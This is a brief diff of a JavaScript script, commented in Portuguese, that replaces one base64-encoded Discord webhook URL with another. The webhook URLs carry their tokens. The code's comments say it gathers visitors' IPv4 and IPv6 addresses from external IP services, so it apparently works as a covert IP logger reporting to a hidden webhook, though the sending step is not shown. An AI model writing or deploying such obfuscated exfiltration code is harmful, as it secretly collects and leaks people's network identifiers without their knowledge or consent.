@@ -1,6 +1,6 @@
 (async () => {
   // URL do seu webhook do Discord
-  const WEBHOOK_URL = atob('aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTM4MjE0NDQ3ODgyMjc5MzIyOC84Nk91TGZGaDVQSWY2d1JIQU5Pamw4eVZ0aDlBZGRqX0owaERFZFV0c0NMQXVCY0FrNlZGR0o1X3hROEJYeUNreWY5cQ==');
+  const WEBHOOK_URL = atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTU2MDQyMTEwNDE3NzM4OTY5MC91RXpOR0pTMzBNOUNLenhWQ3plN3pQUS1zRHk4QWEwelpNNkhDc09IN2pJNE1hNk02X1hFZHppdDdKWERqdmx2U0FXdw==');
 
   // Função para pegar IPs (IPv4 e IPv6) via API externa (ipify e ip6ify)
   async function getIPs() {
